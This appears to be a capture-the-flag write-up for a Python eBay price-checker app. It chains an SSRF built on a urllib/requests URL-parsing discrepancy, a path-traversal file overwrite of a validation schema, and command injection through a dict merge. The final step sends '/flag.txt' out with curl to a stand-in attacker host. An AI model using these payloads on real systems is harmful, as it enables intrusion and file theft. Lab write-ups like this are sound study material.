#ssrf #arbitrary-write #rce #python #urllib
## Overview
It's a website that checks the price of an ebay item.
## Road to flag
The flag is in `/flag.txt` -> RCE/LFR
## Code review
- `command | schedule_data` merges `command` and `schedule_data` -> possible RCE
```python
@app.route('/schedule_search', methods=['POST'])
@token_required
def schedule_search(current_user):
    schedule_data = request.get_json()
    if not validate_json(schedule_data, "./schemas/scheduled_search.json"):
        return jsonify({"error":"bad request"}), 400

    command = {"cmd":f"python /app/scheduled_search.py {current_user}"} #! CMD inj
    if create_cronjob(command | schedule_data):
        return jsonify({"message":"search scheduled"}), 201
    return jsonify({"error":"something went wrong"}), 500
```

- With an SSRF the search result `itemId` would be controllable -> *arbitrary (json) file write* 
```python
@app.route('/search', methods=['POST'])
@token_required
def search(current_user):
    try:
        data = request.get_json()
        if not validate_json(data, "./schemas/search.json"):
            return jsonify({"error":"bad request"}), 400
        url = urlparse(data['url'])
        search_param = data['search_param']
        search_result = search_engines[url.hostname](url, search_param) # hostname=api.ebay.com -> ebay_research(url, search_param)
        save_dir = Path(
            "/results",
            f"{current_user}_last_search"
        )
        save_dir.mkdir(parents=True, exist_ok=True)
        if save_dir.is_dir():
            for item in save_dir.iterdir():
                if item.is_file():
                    item.unlink()
        save_file = save_dir / f"{search_result['itemId']}.json" # what if itemid is controllable
        with open(save_file, 'w') as file:
            json.dump(search_result, file)
        return jsonify(search_result), 200
    except:
        return jsonify({"error":"something went wrong"}), 500
```

- If there's a discrepancy between `base_url.netloc` and `url.hostname` SSRF would be possible
```python
def ebay_research(base_url, search_param):
    [...]
    result = api_research(f"{base_url.scheme}://{base_url.netloc}", token, search_param) # netloc != hostname !?
    return result

def api_research(base_url, access_token, search_param):
    headers = {'Authorization': f'Bearer {access_token}'}
    params = {"q": f"{search_param}","limit": 1}
    response = requests.get(base_url+"/buy/browse/v1/item_summary/search", headers=headers, params=params)
    if response.status_code == 200:
        return response.json()["itemSummaries"][0]
    else:
        print(f"Error: {response.status_code} - {response.text}")
    return {}
```

## Exploitation
1. Finding a way to SSRF
`urrlib` treats only `/?#` as valid delimiters beween the netloc and path/query/fragment
```python
def _splitnetloc(url, start=0):
    delim = len(url)   # position of end of domain part of url, default is end
    for c in '/?#':    # look for delimiters; the order is NOT important
        wdelim = url.find(c, start)        # find first of this delim
        if wdelim >= 0:                    # if found
            delim = min(delim, wdelim)     # use earliest delim position
    return url[start:delim], url[delim:]   # return (domain, rest)
```
so the hostname of `http://attacker.com\@api.ebay.com/` is `api.ebay.com`.
```python
def _hostinfo(self):
	netloc = self.netloc
	_, _, hostinfo = netloc.rpartition('@')
	_, have_open_br, bracketed = hostinfo.partition('[')
	if have_open_br:
		hostname, _, port = bracketed.partition(']')
		_, _, port = port.partition(':')
	else:
		hostname, _, port = hostinfo.partition(':')
	if not port:
		port = None
	return hostname, port
```

`requests` adds a `/` before `\`, resulting in a discrepancy between the two libraries: `http://attacker.com/\@ebay.com` -> `attacker.com`

2. SSRF -> `/app/schemas/scheduled_search.json` overwrite
Request `POST /search` with `{"url":"http://attacker.com\\@api.ebay.com/","search_param":"a"}`
Respond to the request with:
```json
{
	"itemSummaries": [
		{
		  "itemId": "../../../app/schemas/scheduled_search",
		  "$schema": "https://json-schema.org/draft/2020-12/schema",
		  "type": "object",
		  "properties": { },
		  "additionalProperties": true
		}
	]
}
```

3. RCE
Request `POST /schedule_search` with  `{"minutes":1,"cmd":"curl https://attacker -F flag=@/flag.txt"}`
